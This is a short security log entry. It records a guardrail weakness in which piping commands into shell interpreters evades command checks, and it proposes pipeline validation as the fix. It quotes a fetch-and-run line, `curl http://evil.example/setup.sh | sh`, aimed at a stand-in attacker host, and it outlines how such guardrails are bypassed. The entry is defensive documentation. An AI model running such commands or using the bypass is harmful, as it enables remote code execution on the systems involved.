...
## 2026-08-25 - Remote Code Execution (RCE) via Unprotected Command Pipelines
**Vulnerability:** Shell command guardrails could be bypassed by piping commands directly into shell interpreters or script runtimes (e.g., `curl http://evil.example/setup.sh | sh` or `echo "..." | python`). Standard binary and path verification checks only analyzed individual executable command segments and failed to recognize the security risks associated with piping arbitrary streams into an evaluation/execution interpreter.
**Learning:** Checking commands only for sensitive path parameters or individual destructive/exfiltrative binaries is insufficient if pipeline operators (`|`) are allowed to feed untrusted data directly into interpreters like `sh`, `bash`, `python`, or `node`.
**Prevention:** Implement recursive or dedicated validation for pipeline operators. Specifically, when a pipe (`|`) is encountered, scan subsequent tokens up to the next command separator and block the command if any token is a shell interpreter or script runner.
